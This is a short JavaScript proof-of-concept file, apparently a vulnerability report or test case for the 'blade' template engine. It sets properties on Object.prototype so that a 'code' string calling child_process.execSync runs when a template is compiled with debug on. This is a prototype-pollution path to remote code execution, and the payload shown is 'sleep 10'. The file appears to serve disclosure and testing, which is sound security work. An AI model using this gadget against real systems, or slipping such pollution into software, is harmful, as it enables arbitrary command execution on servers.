const blade = require('blade');

/**
 * prototype pollution
 */
Object.prototype.b = {}
Object.prototype.b.name = "somename"
Object.prototype.b.value = "somevalue"
Object.prototype.b.code = "process.mainModule.require('child_process').execSync(\`sleep 10\`)"

const template = `html
    head
        title Blade
    body
        #nav
            ul
                - for(var i in nav)
                    li
                        a(href=nav[i])= i
        #content.center
            h1 Blade is cool`;

blade.compile(template, {'debug': true}, function(err, tmpl) {
    tmpl({'nav': []}, function(err, html) {
        console.log(html, err);
    });
});